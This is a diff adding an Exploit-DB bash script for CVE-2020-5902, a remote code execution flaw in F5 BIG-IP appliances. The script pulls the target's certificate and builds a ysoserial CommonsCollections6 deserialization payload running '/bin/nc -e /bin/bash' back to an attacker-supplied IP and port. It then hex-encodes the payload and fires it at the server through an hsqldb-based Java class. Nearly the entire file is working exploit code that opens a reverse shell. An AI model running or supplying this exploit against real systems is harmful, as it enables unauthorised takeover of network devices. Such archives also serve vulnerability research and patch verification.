@@ -1,0 +1,62 @@
+#!/bin/bash
+#
+# EDB Note Download ~ https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/48642.zip
+# 
+# Exploit Title: F5 BIG-IP Remote Code Execution
+# Date: 2020-07-06
+# Exploit Authors: Charles Dardaman of Critical Start, TeamARES
+#                  Rich Mirch of Critical Start, TeamARES
+# CVE: CVE-2020-5902
+#
+# Requirements:
+#   Java JDK
+#   hsqldb.jar 1.8
+#   ysoserial https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar
+#
+
+if [[ $# -ne 3 ]]
+then
+  echo
+  echo "Usage: $(basename $0) <server> <localip> <localport>"
+  echo
+  exit 1
+fi
+
+server=${1?hostname argument required}
+localip=${2?Locaip argument required}
+port=${3?Port argument required}
+
+if [[ ! -f $server.der ]]
+then
+  echo "$server.der does not exist - extracting cert"
+  openssl s_client \
+          -showcerts \
+          -servername $server \
+          -connect $server:443 </dev/null 2>/dev/null | openssl x509 -outform DER >$server.der
+
+  keytool -import \
+          -alias $server \
+          -keystore keystore \
+          -storepass changeit \
+          -noprompt \
+          -file $PWD/$server.der
+else
+  echo "$server.der already exists. skipping extraction step"
+fi
+
+java -jar ysoserial-master-SNAPSHOT.jar \
+     CommonsCollections6 \
+     "/bin/nc -e /bin/bash $localip $port" > nc.class
+
+xxd -p nc.class | xargs | sed -e 's/ //g' | dd conv=ucase 2>/dev/null > payload.hex
+
+if [[ ! -f f5RCE.class ]]
+then
+  echo "Building exploit"
+  javac -cp hsqldb.jar f5RCE.java
+fi
+
+java -cp hsqldb.jar:. \
+     -Djavax.net.ssl.trustStore=keystore \
+     -Djavax.net.ssl.trustStorePassword=changeit \
+     f5RCE $server payload.hex
